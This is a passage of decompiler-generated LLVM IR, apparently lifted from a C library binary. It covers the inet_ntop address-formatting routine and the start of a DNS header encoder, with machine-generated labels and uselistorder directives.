  uselistorder i32* %r1.global-to-local, { 1, 6, 2, 3, 4, 5, 0 }
  uselistorder i32 100, { 2, 3, 0, 1 }
  uselistorder i8 10, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i8 48, { 0, 5, 6, 1, 2, 3, 4, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_1aed8, { 1, 0 }
  uselistorder label %dec_label_pc_1ae7c, { 1, 0 }
  uselistorder label %dec_label_pc_1ae48, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1aee8 = load i32, i32* @r4, align 4
  store i32 %v3_1aee8, i32* %stack_var_-32, align 4
  %v6_1aee8 = load i32, i32* @r5, align 4
  %v25_1aee8 = ptrtoint i32* %stack_var_-32 to i32
  %v7_1aeec = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_1aeec, label %dec_label_pc_1af10, label %dec_label_pc_1af04

dec_label_pc_1af04:                               ; preds = %entry
  %v7_1af04 = icmp eq i32 %arg1, 10
  br i1 %v7_1af04, label %dec_label_pc_1af24, label %dec_label_pc_1b124

dec_label_pc_1af10:                               ; preds = %entry
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_1af1c = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1b11c

dec_label_pc_1af24:                               ; preds = %dec_label_pc_1af04
  store i32 0, i32* @r1, align 4
  %v2_1af28 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_1af28, i32* @r0, align 4
  store i32 32, i32* @r2, align 4
  %v0_1af30 = call i32 @__GI_memset()
  br label %dec_label_pc_1af50

dec_label_pc_1af3c:                               ; preds = %dec_label_pc_1af50
  %tmp68 = icmp slt i32 %v1_1af40, 0
  %v4_1af50 = zext i1 %tmp68 to i32
  %v5_1af50 = add i32 %v4_1af50, %v1_1af40
  %v3_1af54 = sdiv i32 %v5_1af50, 2
  %v4_1af64 = mul i32 %v3_1af54, 4
  %v5_1af64 = add i32 %v4_1af64, %v25_1aee8
  %v1_1af3c = add i32 %v2_1af60, 1
  %v2_1af3c = inttoptr i32 %v1_1af3c to i8*
  %v3_1af3c = load i8, i8* %v2_1af3c, align 1
  %v4_1af3c = zext i8 %v3_1af3c to i32
  %v3_1af40 = inttoptr i32 %v2_1af60 to i8*
  %v4_1af40 = load i8, i8* %v3_1af40, align 1
  %v6_1af40 = zext i8 %v4_1af40 to i32
  store i32 %v6_1af40, i32* %r2.global-to-local, align 4
  %v4_1af44 = mul nuw nsw i32 %v6_1af40, 256
  %v5_1af44 = or i32 %v4_1af44, %v4_1af3c
  %v2_1af48 = add i32 %v5_1af64, -32
  %v3_1af48 = inttoptr i32 %v2_1af48 to i32*
  store i32 %v5_1af44, i32* %v3_1af48, align 4
  %v0_1af4c = load i32, i32* %r1.global-to-local, align 4
  %v1_1af4c = add i32 %v0_1af4c, 2
  br label %dec_label_pc_1af50

dec_label_pc_1af50:                               ; preds = %dec_label_pc_1af24, %dec_label_pc_1af3c
  %v1_1af40 = phi i32 [ 0, %dec_label_pc_1af24 ], [ %v1_1af4c, %dec_label_pc_1af3c ]
  store i32 %v1_1af40, i32* %r1.global-to-local, align 4
  %v0_1af60 = load i32, i32* @r8, align 4
  %v2_1af60 = add i32 %v0_1af60, %v1_1af40
  store i32 %v2_1af60, i32* %r2.global-to-local, align 4
  %v7_1af68 = icmp sgt i32 %v1_1af40, 15
  br i1 %v7_1af68, label %dec_label_pc_1af6c, label %dec_label_pc_1af3c

dec_label_pc_1af6c:                               ; preds = %dec_label_pc_1af50
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1af7c

dec_label_pc_1af7c:                               ; preds = %dec_label_pc_1af6c, %dec_label_pc_1afc8
  %v0_1afbc = phi i32 [ -1, %dec_label_pc_1af6c ], [ %v0_1aff0, %dec_label_pc_1afc8 ]
  %v0_1afac = phi i32 [ -1, %dec_label_pc_1af6c ], [ %v0_1afdc, %dec_label_pc_1afc8 ]
  %v0_1af90 = phi i32 [ -1, %dec_label_pc_1af6c ], [ %v0_1af908, %dec_label_pc_1afc8 ]
  %v0_1afc8 = phi i32 [ 0, %dec_label_pc_1af6c ], [ %v1_1afc8, %dec_label_pc_1afc8 ]
  %v4_1af80 = mul nuw nsw i32 %v0_1afc8, 4
  %v5_1af80 = add i32 %v4_1af80, %v25_1aee8
  %v1_1af84 = add i32 %v5_1af80, -32
  %v2_1af84 = inttoptr i32 %v1_1af84 to i32*
  %v3_1af84 = load i32, i32* %v2_1af84, align 4
  %v2_1af88 = icmp eq i32 %v3_1af84, 0
  %v7_1af90 = icmp eq i32 %v0_1af90, -1
  br i1 %v2_1af88, label %dec_label_pc_1af90, label %dec_label_pc_1afa4

dec_label_pc_1af90:                               ; preds = %dec_label_pc_1af7c
  br i1 %v7_1af90, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1af90
  store i32 %v0_1afc8, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1afc8

.thread:                                          ; preds = %dec_label_pc_1af90
  %v1_1af9c.pre = load i32, i32* @r4, align 4
  %v2_1af9c = add i32 %v1_1af9c.pre, 1
  store i32 %v2_1af9c, i32* @r4, align 4
  br label %dec_label_pc_1afc8

dec_label_pc_1afa4:                               ; preds = %dec_label_pc_1af7c
  br i1 %v7_1af90, label %dec_label_pc_1afc8, label %dec_label_pc_1afac

dec_label_pc_1afac:                               ; preds = %dec_label_pc_1afa4
  %v7_1afac = icmp eq i32 %v0_1afac, -1
  %v0_1afc0.pre = load i32, i32* @r4, align 4
  %v1_1afb4 = load i32, i32* @r7, align 4
  %v7_1afb8 = icmp sgt i32 %v0_1afc0.pre, %v1_1afb4
  %or.cond = or i1 %v7_1afac, %v7_1afb8
  br i1 %or.cond, label %dec_label_pc_1afbc, label %dec_label_pc_1afc4

dec_label_pc_1afbc:                               ; preds = %dec_label_pc_1afac
  store i32 %v0_1afbc, i32* @r6, align 4
  store i32 %v0_1afc0.pre, i32* @r7, align 4
  br label %dec_label_pc_1afc4

dec_label_pc_1afc4:                               ; preds = %dec_label_pc_1afac, %dec_label_pc_1afbc
  %v0_1afac13 = phi i32 [ %v0_1afbc, %dec_label_pc_1afbc ], [ %v0_1afac, %dec_label_pc_1afac ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1afc8

dec_label_pc_1afc8:                               ; preds = %bb, %.thread, %dec_label_pc_1afa4, %dec_label_pc_1afc4
  %v0_1aff0 = phi i32 [ %v0_1afbc, %.thread ], [ %v0_1afc8, %bb ], [ %v0_1afbc, %dec_label_pc_1afa4 ], [ -1, %dec_label_pc_1afc4 ]
  %v0_1af908 = phi i32 [ %v0_1af90, %.thread ], [ %v0_1afc8, %bb ], [ -1, %dec_label_pc_1afa4 ], [ -1, %dec_label_pc_1afc4 ]
  %v0_1afdc = phi i32 [ %v0_1afac, %.thread ], [ %v0_1afac, %bb ], [ %v0_1afac, %dec_label_pc_1afa4 ], [ %v0_1afac13, %dec_label_pc_1afc4 ]
  %v1_1afc8 = add nuw nsw i32 %v0_1afc8, 1
  store i32 %v1_1afc8, i32* %r1.global-to-local, align 4
  %v7_1afd0 = icmp slt i32 %v1_1afc8, 8
  br i1 %v7_1afd0, label %dec_label_pc_1af7c, label %dec_label_pc_1afd4

dec_label_pc_1afd4:                               ; preds = %dec_label_pc_1afc8
  %v7_1afd4 = icmp eq i32 %v0_1aff0, -1
  br i1 %v7_1afd4, label %dec_label_pc_1aff4, label %dec_label_pc_1afdc

dec_label_pc_1afdc:                               ; preds = %dec_label_pc_1afd4
  %v7_1afdc = icmp eq i32 %v0_1afdc, -1
  %v0_1afec.pre = load i32, i32* @r4, align 4
  br i1 %v7_1afdc, label %dec_label_pc_1afec, label %dec_label_pc_1afe4

dec_label_pc_1afe4:                               ; preds = %dec_label_pc_1afdc
  %v1_1afe4 = load i32, i32* @r7, align 4
  %v7_1afe8 = icmp sgt i32 %v0_1afec.pre, %v1_1afe4
  br i1 %v7_1afe8, label %dec_label_pc_1afec, label %dec_label_pc_1aff4

dec_label_pc_1afec:                               ; preds = %dec_label_pc_1afdc, %dec_label_pc_1afe4
  store i32 %v0_1afec.pre, i32* @r7, align 4
  store i32 %v0_1aff0, i32* @r6, align 4
  br label %dec_label_pc_1aff4

dec_label_pc_1aff4:                               ; preds = %dec_label_pc_1afe4, %dec_label_pc_1afd4, %dec_label_pc_1afec
  %v0_1aff4 = phi i32 [ %v0_1afdc, %dec_label_pc_1afe4 ], [ %v0_1afdc, %dec_label_pc_1afd4 ], [ %v0_1aff0, %dec_label_pc_1afec ]
  %v7_1aff4 = icmp eq i32 %v0_1aff4, -1
  br i1 %v7_1aff4, label %bb49, label %dec_label_pc_1affc

dec_label_pc_1affc:                               ; preds = %dec_label_pc_1aff4
  %v0_1affc = load i32, i32* @r7, align 4
  %v7_1b000 = icmp slt i32 %v0_1affc, 2
  br i1 %v7_1b000, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_1affc
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_1aff4, %dec_label_pc_1affc, %bb48
  %v0_1b01023 = phi i32 [ %v0_1aff4, %dec_label_pc_1aff4 ], [ %v0_1aff4, %dec_label_pc_1affc ], [ -1, %bb48 ]
  %v2_1b004 = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_1b004, i32* @r4, align 4
  %v9_1b070 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_1b01063 = icmp eq i32 %v0_1b01023, -1
  br label %dec_label_pc_1b010

dec_label_pc_1b010:                               ; preds = %bb49, %dec_label_pc_1b0c4
  %v7_1b01067 = phi i1 [ %v7_1b01063, %bb49 ], [ %v7_1b010, %dec_label_pc_1b0c4 ]
  %v0_1b03c66 = phi i32 [ 0, %bb49 ], [ %v1_1b0c4, %dec_label_pc_1b0c4 ]
  %v1_1b02c65 = phi i32 [ %v0_1b01023, %bb49 ], [ %v0_1b010.pre, %dec_label_pc_1b0c4 ]
  %v3_1b04464 = phi i32 [ %v2_1b004, %bb49 ], [ %v3_1b03424, %dec_label_pc_1b0c4 ]
  br i1 %v7_1b01067, label %dec_label_pc_1b03c, label %dec_label_pc_1b018

dec_label_pc_1b018:                               ; preds = %dec_label_pc_1b010
  %v9_1b018 = icmp eq i32 %v0_1b03c66, %v1_1b02c65
  %v5_1b01c = icmp slt i32 %v0_1b03c66, %v1_1b02c65
  br i1 %v5_1b01c, label %dec_label_pc_1b03c, label %dec_label_pc_1b020

dec_label_pc_1b020:                               ; preds = %dec_label_pc_1b018
  %v1_1b020 = load i32, i32* @r7, align 4
  %v2_1b020 = add i32 %v1_1b020, %v1_1b02c65
  %v6_1b028 = icmp slt i32 %v0_1b03c66, %v2_1b020
  br i1 %v6_1b028, label %dec_label_pc_1b02c, label %dec_label_pc_1b03c

dec_label_pc_1b02c:                               ; preds = %dec_label_pc_1b020
  br i1 %v9_1b018, label %bb51, label %dec_label_pc_1b0c4

bb51:                                             ; preds = %dec_label_pc_1b02c
  %v4_1b034 = inttoptr i32 %v3_1b04464 to i8*
  store i8 58, i8* %v4_1b034, align 1
  %v5_1b034 = load i32, i32* @r4, align 4
  %v6_1b034 = add i32 %v5_1b034, 1
  store i32 %v6_1b034, i32* @r4, align 4
  br label %dec_label_pc_1b0c4

dec_label_pc_1b03c:                               ; preds = %dec_label_pc_1b020, %dec_label_pc_1b018, %dec_label_pc_1b010
  %v2_1b03c = icmp eq i32 %v0_1b03c66, 0
  br i1 %v2_1b03c, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_1b03c
  %v4_1b044 = inttoptr i32 %v3_1b04464 to i8*
  store i8 58, i8* %v4_1b044, align 1
  %v5_1b044 = load i32, i32* @r4, align 4
  %v6_1b044 = add i32 %v5_1b044, 1
  store i32 %v6_1b044, i32* @r4, align 4
  %v0_1b048.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1b03c, %bb52
  %v0_1b088 = phi i32 [ %v3_1b04464, %dec_label_pc_1b03c ], [ %v6_1b044, %bb52 ]
  %v1_1b0ac = phi i32 [ 0, %dec_label_pc_1b03c ], [ %v0_1b048.pre, %bb52 ]
  %v7_1b048 = icmp eq i32 %v1_1b0ac, 6
  br i1 %v7_1b048, label %dec_label_pc_1b050, label %dec_label_pc_1b0a8

dec_label_pc_1b050:                               ; preds = %.thread3
  %v0_1b050 = load i32, i32* @r6, align 4
  %v2_1b050 = icmp eq i32 %v0_1b050, 0
  br i1 %v2_1b050, label %dec_label_pc_1b058, label %dec_label_pc_1b0a8

dec_label_pc_1b058:                               ; preds = %dec_label_pc_1b050
  %v0_1b058 = load i32, i32* @r7, align 4
  %v7_1b058 = icmp eq i32 %v0_1b058, 6
  br i1 %v7_1b058, label %dec_label_pc_1b078, label %dec_label_pc_1b060

dec_label_pc_1b060:                               ; preds = %dec_label_pc_1b058
  %v7_1b060 = icmp eq i32 %v0_1b058, 5
  br i1 %v7_1b060, label %dec_label_pc_1b068, label %dec_label_pc_1b0a8

dec_label_pc_1b068:                               ; preds = %dec_label_pc_1b060
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_1b070, label %dec_label_pc_1b078, label %dec_label_pc_1b0a8

dec_label_pc_1b078:                               ; preds = %dec_label_pc_1b068, %dec_label_pc_1b058
  %v2_1b07c = sub i32 %v25_1aee8, %v0_1b088
  %v0_1b080 = load i32, i32* @r8, align 4
  %v1_1b080 = add i32 %v0_1b080, 12
  %v1_1b084 = add i32 %v2_1b07c, -32
  store i32 %v1_1b084, i32* %r2.global-to-local, align 4
  store i32 %v0_1b088, i32* %r1.global-to-local, align 4
  %v3_1b08c = call i32 @inet_ntop4(i32 %v1_1b080, i32 %v0_1b088, i32 %v1_1b084)
  %v2_1b090 = icmp eq i32 %v3_1b08c, 0
  br i1 %v2_1b090, label %dec_label_pc_1b11c, label %dec_label_pc_1b098

dec_label_pc_1b098:                               ; preds = %dec_label_pc_1b078
  %v0_1b098 = load i32, i32* @r4, align 4
  %v1_1b098 = inttoptr i32 %v0_1b098 to i8*
  %v3_1b09c = call i32 @strlen(i8* %v1_1b098)
  %v0_1b0a0 = load i32, i32* @r4, align 4
  %v2_1b0a0 = add i32 %v0_1b0a0, %v3_1b09c
  store i32 %v2_1b0a0, i32* @r4, align 4
  %v0_1b0d8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1b0d8

dec_label_pc_1b0a8:                               ; preds = %dec_label_pc_1b068, %dec_label_pc_1b060, %dec_label_pc_1b050, %.thread3
  %v4_1b0ac = mul i32 %v1_1b0ac, 4
  %v5_1b0ac = add i32 %v4_1b0ac, %v25_1aee8
  store i32 %v0_1b088, i32* @r0, align 4
  %v1_1b0b4 = add i32 %v5_1b0ac, -32
  %v2_1b0b4 = inttoptr i32 %v1_1b0b4 to i32*
  %v3_1b0b4 = load i32, i32* %v2_1b0b4, align 4
  store i32 %v3_1b0b4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1dee0.1038 to i32), i32* %r1.global-to-local, align 4
  %v4_1b0bc = call i32 @sprintf(i32 %v0_1b088, i32 ptrtoint ([3 x i8]* @global_var_1dee0.1038 to i32), i32 %v3_1b0b4)
  %v0_1b0c0 = load i32, i32* @r4, align 4
  %v2_1b0c0 = add i32 %v0_1b0c0, %v4_1b0bc
  store i32 %v2_1b0c0, i32* @r4, align 4
  br label %dec_label_pc_1b0c4

dec_label_pc_1b0c4:                               ; preds = %dec_label_pc_1b02c, %bb51, %dec_label_pc_1b0a8
  %v3_1b03424 = phi i32 [ %v3_1b04464, %dec_label_pc_1b02c ], [ %v6_1b034, %bb51 ], [ %v2_1b0c0, %dec_label_pc_1b0a8 ]
  %v0_1b0c4 = load i32, i32* @r5, align 4
  %v1_1b0c4 = add i32 %v0_1b0c4, 1
  %v0_1b010.pre = load i32, i32* @r6, align 4
  store i32 %v1_1b0c4, i32* @r5, align 4
  %v7_1b0cc = icmp slt i32 %v1_1b0c4, 8
  %v7_1b010 = icmp eq i32 %v0_1b010.pre, -1
  br i1 %v7_1b0cc, label %dec_label_pc_1b010, label %dec_label_pc_1b0d0

dec_label_pc_1b0d0:                               ; preds = %dec_label_pc_1b0c4
  br i1 %v7_1b010, label %.thread4, label %dec_label_pc_1b0d8

dec_label_pc_1b0d8:                               ; preds = %dec_label_pc_1b0d0, %dec_label_pc_1b098
  %v3_1b0e4 = phi i32 [ %v3_1b03424, %dec_label_pc_1b0d0 ], [ %v2_1b0a0, %dec_label_pc_1b098 ]
  %v0_1b0d8 = phi i32 [ %v0_1b010.pre, %dec_label_pc_1b0d0 ], [ %v0_1b0d8.pre, %dec_label_pc_1b098 ]
  %v1_1b0d8 = load i32, i32* @r7, align 4
  %v2_1b0d8 = add i32 %v1_1b0d8, %v0_1b0d8
  %v7_1b0dc = icmp eq i32 %v2_1b0d8, 8
  br i1 %v7_1b0dc, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_1b0d8
  %v4_1b0e4 = inttoptr i32 %v3_1b0e4 to i8*
  store i8 58, i8* %v4_1b0e4, align 1
  %v5_1b0e4 = load i32, i32* @r4, align 4
  %v6_1b0e4 = add i32 %v5_1b0e4, 1
  store i32 %v6_1b0e4, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1b0d8, %dec_label_pc_1b0d0, %bb53
  %v2_1b0ec = phi i32 [ %v3_1b0e4, %dec_label_pc_1b0d8 ], [ %v3_1b03424, %dec_label_pc_1b0d0 ], [ %v6_1b0e4, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1b0ec = inttoptr i32 %v2_1b0ec to i8*
  store i8 0, i8* %v3_1b0ec, align 1
  %v4_1b0ec = load i32, i32* @r4, align 4
  %v5_1b0ec = add i32 %v4_1b0ec, 1
  store i32 %v2_1b004, i32* %r1.global-to-local, align 4
  %v2_1b0f4 = sub i32 %v5_1b0ec, %v2_1b004
  %v1_1b0f8 = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_1b0f4, %v1_1b0f8
  br i1 %tmp69, label %dec_label_pc_1b100, label %dec_label_pc_1b114

dec_label_pc_1b100:                               ; preds = %.thread4
  %v0_1b100 = call i32 @__errno_location()
  %v0_1b108 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1b108, i32* %r2.global-to-local, align 4
  %v2_1b10c = inttoptr i32 %v0_1b100 to i32*
  store i32 28, i32* %v2_1b10c, align 4
  %v0_1b134.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b134

dec_label_pc_1b114:                               ; preds = %.thread4
  %v0_1b114 = load i32, i32* @sb, align 4
  %v2_1b118 = bitcast i32* %stack_var_-110 to i8*
  %v3_1b118 = call i32 @strcpy(i32 %v0_1b114, i8* %v2_1b118)
  br label %dec_label_pc_1b11c

dec_label_pc_1b11c:                               ; preds = %dec_label_pc_1b078, %dec_label_pc_1af10, %dec_label_pc_1b114
  %v0_1b11c = phi i32 [ 0, %dec_label_pc_1b078 ], [ %v3_1af1c, %dec_label_pc_1af10 ], [ %v3_1b118, %dec_label_pc_1b114 ]
  store i32 %v0_1b11c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b134

dec_label_pc_1b124:                               ; preds = %dec_label_pc_1af04
  %v0_1b124 = call i32 @__errno_location()
  %v2_1b12c = inttoptr i32 %v0_1b124 to i32*
  store i32 97, i32* %v2_1b12c, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b134

dec_label_pc_1b134:                               ; preds = %dec_label_pc_1b11c, %dec_label_pc_1b100, %dec_label_pc_1b124
  %v0_1b134 = phi i32 [ %v0_1b11c, %dec_label_pc_1b11c ], [ %v0_1b134.pre, %dec_label_pc_1b100 ], [ 0, %dec_label_pc_1b124 ]
  store i32 %v6_1aee8, i32* %r5.global-to-local, align 4
  ret i32 %v0_1b134

; uselistorder directives
  uselistorder i1 %v7_1b010, { 1, 0 }
  uselistorder i32 %v0_1b010.pre, { 1, 0, 2 }
  uselistorder i32 %v1_1b0c4, { 1, 0, 2 }
  uselistorder i32 %v0_1b088, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_1b04464, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1b02c65, { 2, 0, 1 }
  uselistorder i32 %v0_1b03c66, { 3, 2, 0, 1 }
  uselistorder i32 %v2_1b004, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1b01023, { 1, 0 }
  uselistorder i32 %v0_1aff4, { 1, 2, 0 }
  uselistorder i32 %v1_1afc8, { 1, 2, 0 }
  uselistorder i32 %v0_1afdc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1aff0, { 1, 2, 0, 3 }
  uselistorder i1 %v7_1af90, { 1, 0 }
  uselistorder i32 %v0_1afc8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_1afac, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1afbc, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1af60, { 2, 1, 0 }
  uselistorder i32 %v1_1af40, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_1aee8, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 6, 7, 8, 9, 10, 11, 12, 13, 1, 2, 4, 3, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 1, 8, 7, 2, 0 }
  uselistorder i32 97, { 2, 3, 6, 0, 1, 7, 4, 5 }
  uselistorder i32 ()* @__GI_memset, { 18, 17, 9, 16, 5, 4, 3, 7, 0, 2, 15, 8, 1, 6, 19, 14, 13, 12, 11, 10 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1b134, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b11c, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b0c4, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1b010, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1aff4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1afec, { 1, 0 }
  uselistorder label %dec_label_pc_1afc8, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1afc4, { 1, 0 }
  uselistorder label %dec_label_pc_1af7c, { 1, 0 }
  uselistorder label %dec_label_pc_1af50, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_1b14c = load i32, i32* @r4, align 4
  store i32 %v3_1b14c, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_1b15c = icmp sgt i32 %arg3, 11
  br i1 %v7_1b15c, label %dec_label_pc_1b160, label %dec_label_pc_1b228

dec_label_pc_1b160:                               ; preds = %entry
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_1b160 = add i32 %tmp, 1
  %v2_1b160 = inttoptr i32 %v1_1b160 to i8*
  %v3_1b160 = load i8, i8* %v2_1b160, align 1
  store i8 %v3_1b160, i8* %tmp18, align 1
  %v2_1b168 = load i32, i32* %arg1, align 4
  %v1_1b16c = trunc i32 %v2_1b168 to i8
  %v4_1b16c = add i32 %arg2, 1
  %v5_1b16c = inttoptr i32 %v4_1b16c to i8*
  store i8 %v1_1b16c, i8* %v5_1b16c, align 1
  %v0_1b170 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b170 = add i32 %v0_1b170, 12
  %v2_1b170 = inttoptr i32 %v1_1b170 to i32*
  %v3_1b170 = load i32, i32* %v2_1b170, align 4
  %v1_1b174 = add i32 %v0_1b170, 4
  %v2_1b174 = inttoptr i32 %v1_1b174 to i32*
  %v3_1b174 = load i32, i32* %v2_1b174, align 4
  %v1_1b178 = add i32 %v0_1b170, 16
  %v2_1b178 = inttoptr i32 %v1_1b178 to i32*
  %v3_1b178 = load i32, i32* %v2_1b178, align 4
  %v1_1b17c = add i32 %tmp, 8
  %v2_1b17c = inttoptr i32 %v1_1b17c to i32*
  %v3_1b17c = load i32, i32* %v2_1b17c, align 4
  %v2_1b180 = icmp eq i32 %v3_1b170, 0
  %. = select i1 %v2_1b180, i32 0, i32 4
  %v2_1b18c = icmp eq i32 %v3_1b174, 0
  %v1_1b190 = add i32 %v0_1b170, 20
  %v2_1b190 = inttoptr i32 %v1_1b190 to i32*
  %v3_1b190 = load i32, i32* %v2_1b190, align 4
  %storemerge12 = select i1 %v2_1b18c, i32 0, i32 128
  %v1_1b19c = urem i32 %v3_1b17c, 16
  %v2_1b1a0 = icmp eq i32 %v3_1b178, 0
  %.29 = select i1 %v2_1b1a0, i32 0, i32 2
  %v4_1b1ac = mul nuw nsw i32 %v1_1b19c, 8
  %v5_1b1ac = or i32 %v4_1b1ac, %.
  %v2_1b1b0 = icmp eq i32 %v3_1b190, 0
  br i1 %v2_1b1b0, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_1b160
  %v2_1b1b4 = or i32 %v5_1b1ac, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_1b160, %bb25
  %v1_1b1bc = phi i32 [ %v5_1b1ac, %dec_label_pc_1b160 ], [ %v2_1b1b4, %bb25 ]
  %v2_1b1b8 = or i32 %.29, %storemerge12
  %v2_1b1bc = or i32 %v2_1b1b8, %v1_1b1bc
  %v1_1b1c0 = trunc i32 %v2_1b1bc to i8
  %v2_1b1c0 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b1c0 = add i32 %v2_1b1c0, 2
  %v4_1b1c0 = inttoptr i32 %v3_1b1c0 to i8*
  store i8 %v1_1b1c0, i8* %v4_1b1c0, align 1
  %v0_1b1c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b1c4 = add i32 %v0_1b1c4, 24
  %v1_1b1c8 = inttoptr i32 %v1_1b1c4 to i32*
  %v2_1b1c8 = load i32, i32* %v1_1b1c8, align 4
  %v3_1b1c8 = add i32 %v0_1b1c4, 28
  %v4_1b1c8 = inttoptr i32 %v3_1b1c8 to i32*
  %v5_1b1c8 = load i32, i32* %v4_1b1c8, align 4
  %v2_1b1cc = icmp eq i32 %v2_1b1c8, 0
  %v1_1b1d0 = urem i32 %v5_1b1c8, 16
  %.30 = select i1 %v2_1b1cc, i32 0, i32 128
  %v2_1b1dc = or i32 %v1_1b1d0, %.30
  %v1_1b1e0 = trunc i32 %v2_1b1dc to i8
  %v2_1b1e0 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b1e0 = add i32 %v2_1b1e0, 3
  %v4_1b1e0 = inttoptr i32 %v3_1b1e0 to i8*
  store i8 %v1_1b1e0, i8* %v4_1b1e0, align 1
  %v0_1b1e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b1e4 = add i32 %v0_1b1e4, 33
  %v2_1b1e4 = inttoptr i32 %v1_1b1e4 to i8*
  %v3_1b1e4 = load i8, i8* %v2_1b1e4, align 1
  %v2_1b1e8 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b1e8 = add i32 %v2_1b1e8, 4
  %v4_1b1e8 = inttoptr i32 %v3_1b1e8 to i8*
  store i8 %v3_1b1e4, i8* %v4_1b1e8, align 1
  %v0_1b1ec = load i32, i32* %lr.global-to-local, align 4
  %v1_1b1ec = add i32 %v0_1b1ec, 32
  %v2_1b1ec = inttoptr i32 %v1_1b1ec to i32*
  %v3_1b1ec = load i32, i32* %v2_1b1ec, align 4
  %v1_1b1f0 = trunc i32 %v3_1b1ec to i8
  %v2_1b1f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b1f0 = add i32 %v2_1b1f0, 5
  %v4_1b1f0 = inttoptr i32 %v3_1b1f0 to i8*
  store i8 %v1_1b1f0, i8* %v4_1b1f0, align 1
  %v0_1b1f4 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b1f4 = add i32 %v0_1b1f4, 37
  %v2_1b1f4 = inttoptr i32 %v1_1b1f4 to i8*
  %v3_1b1f4 = load i8, i8* %v2_1b1f4, align 1
  %v2_1b1f8 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b1f8 = add i32 %v2_1b1f8, 6
  %v4_1b1f8 = inttoptr i32 %v3_1b1f8 to i8*
  store i8 %v3_1b1f4, i8* %v4_1b1f8, align 1
